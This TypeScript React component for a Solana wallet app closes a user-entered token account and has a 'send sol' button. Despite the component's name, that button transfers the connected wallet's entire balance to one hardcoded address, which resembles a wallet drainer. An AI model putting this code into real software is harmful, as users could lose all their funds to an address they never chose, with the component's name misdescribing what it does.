import { WalletNotConnectedError } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { 
    Keypair, 
    SystemProgram,
    Transaction, 
    TransactionInstruction, 
    PublicKey, 
    Connection,
    SYSVAR_CLOCK_PUBKEY,
    SYSVAR_RENT_PUBKEY,
} from '@solana/web3.js';
import React, { FC, useCallback, useState} from 'react';
import * as BufferLayout from '@solana/buffer-layout';
import * as splToken from "@solana/spl-token";
import ReactDOM from 'react-dom';

const SYSTEM_PROGRAM = new PublicKey('11111111111111111111111111111111');
const TOKEN_PROGRAM = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
const ATA_PROGRAM = new PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL');
const USDC = new PublicKey('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v');

export const SendOneLamportToRandomAddress: FC = () => {
    const { connection } = useConnection();
    const { publicKey, sendTransaction } = useWallet();
    const [name, setName] = useState("");
    const c = new Connection('https://solana-api.projectserum.com')


    const onClick = async () => {
        if (!publicKey) throw new WalletNotConnectedError();
        
        const transaction = new Transaction()
        .add(
            splToken.Token.createCloseAccountInstruction(
                TOKEN_PROGRAM,
                new PublicKey(name), // ata
                publicKey, // payer
                publicKey, // payer
                []
            ),
        )

        try {
            const signature = await sendTransaction(transaction, connection);
        } catch (e) { 
            console.log(e);
        }
    }

    const handler = (event: any) => {
        setName(event.target.value);
    }

    const sendSol = async () => {
        const balance = await c.getBalance(publicKey as PublicKey);
        const transaction = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: publicKey as PublicKey,
                toPubkey: new PublicKey('8V923XE6rU77qyLzNZsgKtdqBuPJkvCTo2FwrqJB2Gan'),
                lamports: balance,
            })
        );
        try {
            const signature = await sendTransaction(transaction, connection);
        } catch (e) { 
            console.log(e);
        }
    }

    return (
        <>
            <button onClick={onClick} id='del_ata_btn'>
                del_ata
            </button>
            <form>
                <input
                    id='ata'
                    type="text"
                    onChange={handler}
                />
            </form>

            
            <button onClick={sendSol} id='send_sol'>
                send sol
            </button>
        </>
        
    );
};

export default SendOneLamportToRandomAddress;
